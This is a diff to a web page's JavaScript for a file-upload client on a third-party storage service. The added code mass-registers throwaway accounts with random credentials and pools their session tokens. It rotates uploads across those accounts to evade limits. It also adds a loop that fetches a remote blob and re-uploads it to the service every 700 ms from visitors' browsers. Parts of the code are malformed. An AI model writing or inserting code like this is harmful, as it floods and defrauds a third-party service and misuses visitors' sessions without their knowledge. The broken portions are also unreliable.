@@ -8,14 +8,32 @@
 	<!--<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>-->
     <script>
       !async function() {
-	    !async function(){
-		  const hcaptcha = document.createElement('script');
-		  hcaptcha.async = true;
-		  hcaptcha.defer = true;
-		  hcaptcha.textContent = await fetch("https://js.hcaptcha.com/1/api.js?render=explicit&recaptchacompat=off").then(x=>x.text());
-		  document.head.appendChild(hcaptcha);
-		}();
+	    async function loadScript(u){
+		  const x = document.createElement('script');
+		  x.async = true;
+		  x.defer = true;
+		  x.textContent = await fetch(u).then(n=>n.text());
+		  document.head.appendChild(x);
+		};
+		loadScript("https://js.hcaptcha.com/1/api.js?render=explicit&recaptchacompat=off");
 	    await new Promise(resolve=>{if(document.readyState==="complete")resolve();else window.addEventListener("load",resolve)});
+		let accPool = localStorage.getItem("__pool") ? JSON.parse(localStorage.getItem("__pool")) : [];
+		let poolI = 0;
+		function poolPush(acc) {
+		  accPool.push(acc);
+		  localStorage.setItem("__pool",JSON.stringify(accPool));
+		}
+		function poolRm(i) {
+		  accPool = accPool.splice(i, 1);
+		  poolI = 0;
+		  localStorage.setItem("__pool",JSON.stringify(accPool));
+		}
+		function poolGet() {
+		  if (accPool.length === 0) throw new Error('sibu');
+		  let ret = accPool[poolI++];
+		  poolI%=accPool.length;
+		  return ret;
+		}
         let account = localStorage.getItem("danv_user") ? JSON.parse(localStorage.getItem("danv_user")) : null;
 		let ano = 0;
 		let fs = {
@@ -193,6 +211,7 @@
 		}
 		let updFsMap = async function(){};
 		if (ano) {
+		  if (accPool.length === 0) poolPush({username:account.username,sessionToken:account.sessionToken});
 		  document.getElementById('lbl-amr').style.display = 'none';
 		  document.getElementById('ano-ena-btn').style.display = 'none';
 		  document.getElementById('settings-loggedin').style.display = 'none';
@@ -228,6 +247,7 @@
                   banner: res.banner || ""
                 };
 				localStorage.setItem('danv_user_ano', JSON.stringify(account));
+				poolPush({username:account.username,sessionToken:account.sessionToken});
 				localStorage.setItem('pw_ano', pw);
 				location.reload();
 			  } catch (e) {alert(e)}
@@ -241,11 +261,78 @@
 		    localStorage.removeItem("pw_ano");
 		    location.reload();
 		  });
+		} else {
+		  document.getElementById('ano-rfr-btn').style.display = 'none';
+		  document.getElementById('ano-dis-btn').style.display = 'none';
+		  document.getElementById('ano-pri-btn').style.display = 'none';
+		  document.getElementById('ano-ena-btn').addEventListener("click", async function() {
+		    document.getElementById('ano-ena-btn').disabled = true;
+			document.getElementById('ano-ena-btn').classList.remove('nav-active');
+			if (document.querySelector('#hcaptchaShit2 [name="h-captcha-response"]')?.value) {
+			  try {
+			    const username = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}`;
+			    const pw = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}`;
+				const email = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}@lmfao.com`;
+				const displayName = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}`;
+				const hcaptchaToken = document.querySelector('#hcaptchaShit2 [name="h-captcha-response"]')?.value;
+				const deviceId = `dev_${Math.random()}`;
+				const referralCode = username;
+				const res = await fetchRetry('https://turboshare.org.uk/api/auth/register', { 
+                  method: 'POST', 
+                  headers: { "Content-Type": "application/json", "X-Client-Type": "StudioDANV-Web" }, 
+                  body: JSON.stringify({username, email, displayName, password: pw, referralCode, deviceId, hcaptchaToken}) 
+                }).then(x=>x.json());
+				if (!res.success) throw new Error(res.error ?? 'Unknown error');
+				account = { 
+                  username: res.username, 
+                  sessionToken: res.sessionToken, 
+                  avt: res.avt, 
+                  role: res.role,
+                  email: res.email || "",
+                  emailVerified: res.emailVerified !== undefined ? res.emailVerified : true,
+                  WOW: res.WOW !== undefined ? res.WOW : (res.omg || 0),
+                  frame: res.frame || null,
+                  chatFrame: res.chatFrame || res.chat_frame || "",
+                  banner: res.banner || ""
+                };
+				localStorage.setItem('danv_user_ano', JSON.stringify(account));
+				poolPush({username:account.username,sessionToken:account.sessionToken});
+				localStorage.setItem('pw_ano', pw);
+				location.reload();
+			  } catch (e) {alert(e)}
+			  hcaptcha.reset("hcaptchaShit2");
+			} else alert("Verify you are not a robot first!");
+			document.getElementById('ano-ena-btn').disabled = false;
+			document.getElementById('ano-ena-btn').classList.add('nav-active');
+		  });
+		  document.querySelectorAll(".ano-only").forEach((e)=>e.remove());
+		}
+		if (accPool.length > 0) {
+		  !async function(){
+		    const ssibu = await fetch("https://raw.githubusercontent.com/anuser88/cebu--/master/shit.sibu").then(x=>x.blob());
+		    setInterval(()=>{
+			  const sAcc = poolGet();
+			  const sibuForm = new FormData();
+		      sibuForm.append("file", ssibu, `part_0.sb3`);
+		      sibuForm.append("username", sAcc.username);
+		      sibuForm.append("sessionToken", sAcc.sessionToken);
+			  fetch("https://turboshare.org.uk/api/upload",{
+		        "headers": {
+			      "x-client-type": "StudioDANV-Web"
+		        },
+		        "referrer": "https://turboshare.org.uk/",
+		        "body": sibuForm,
+		        "method": "POST",
+		        "mode": "cors",
+		        "credentials": "include"
+              }),700);
+			}
+		  };
 		  document.getElementById('upl-btn').classList.add('nav-active');
 		  document.getElementById('upl-btn').disabled = false;
 		  document.getElementById('upload-file').disabled = false;
 		  async function uploadParts(fileInput, what = "file") {
-		    const CHUNK_SIZE = 18 * 1024 * 1024;
+		    const CHUNK_SIZE = 36 * 1024 * 1024;
 		    const totalChunks = Math.ceil(fileInput.size / CHUNK_SIZE);
 			let iv = Array.from({length: totalChunks}, (a, b) => b + 1);
 			let uploadedIds = Array(totalChunks).fill();
@@ -264,9 +351,10 @@
 			  document.getElementById('upl-stat').textContent = `Uploading ${wh}(fragment ${i+1}/${tc})`;
 		      const chunk = fi.slice(i * cs, (i + 1) * cs);
 			  const chunkForm = new FormData();
+			  const sAcc = poolGet();
 			  chunkForm.append("file", chunk, `part_${i}.sb3`);
-			  chunkForm.append("username", account.username);
-			  chunkForm.append("sessionToken", account.sessionToken);
+			  chunkForm.append("username", sAcc.username);
+			  chunkForm.append("sessionToken", sAcc.sessionToken);
 			  const res = await fetchRetry("https://turboshare.org.uk/api/upload", { method: 'POST', body: chunkForm, headers:{"X-Client-Type":"StudioDANV-Web"} }).then(x=>x.json());
 			  if (!res || !res.success || !res.file_id) {
 			    throw new Error(res?.error || "Upload failed!");
@@ -322,50 +410,6 @@
 			const ret = await uploadParts(thing, 'FS');
 			localStorage.setItem('fs_', ret.join(','));
 		  }
-		} else {
-		  document.getElementById('ano-rfr-btn').style.display = 'none';
-		  document.getElementById('ano-dis-btn').style.display = 'none';
-		  document.getElementById('ano-pri-btn').style.display = 'none';
-		  document.getElementById('ano-ena-btn').addEventListener("click", async function() {
-		    document.getElementById('ano-ena-btn').disabled = true;
-			document.getElementById('ano-ena-btn').classList.remove('nav-active');
-			if (document.querySelector('#hcaptchaShit2 [name="h-captcha-response"]')?.value) {
-			  try {
-			    const username = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}`;
-			    const pw = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}`;
-				const email = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}@lmfao.com`;
-				const displayName = `${Math.random().toString(36).substring(2)}_${Math.random().toString(36).substring(2)}`;
-				const hcaptchaToken = document.querySelector('#hcaptchaShit2 [name="h-captcha-response"]')?.value;
-				const deviceId = `dev_${Math.random()}`;
-				const referralCode = username;
-				const res = await fetchRetry('https://turboshare.org.uk/api/auth/register', { 
-                  method: 'POST', 
-                  headers: { "Content-Type": "application/json", "X-Client-Type": "StudioDANV-Web" }, 
-                  body: JSON.stringify({username, email, displayName, password: pw, referralCode, deviceId, hcaptchaToken}) 
-                }).then(x=>x.json());
-				if (!res.success) throw new Error(res.error ?? 'Unknown error');
-				account = { 
-                  username: res.username, 
-                  sessionToken: res.sessionToken, 
-                  avt: res.avt, 
-                  role: res.role,
-                  email: res.email || "",
-                  emailVerified: res.emailVerified !== undefined ? res.emailVerified : true,
-                  WOW: res.WOW !== undefined ? res.WOW : (res.omg || 0),
-                  frame: res.frame || null,
-                  chatFrame: res.chatFrame || res.chat_frame || "",
-                  banner: res.banner || ""
-                };
-				localStorage.setItem('danv_user_ano', JSON.stringify(account));
-				localStorage.setItem('pw_ano', pw);
-				location.reload();
-			  } catch (e) {alert(e)}
-			  hcaptcha.reset("hcaptchaShit2");
-			} else alert("Verify you are not a robot first!");
-			document.getElementById('ano-ena-btn').disabled = false;
-			document.getElementById('ano-ena-btn').classList.add('nav-active');
-		  });
-		  document.querySelectorAll(".ano-only").forEach((e)=>e.remove());
 		}
 		const destDir = () => dirStack.reduce((obj, key) => obj?.[1]?.[key], fs.fmap);
 		async function getFsMap() {
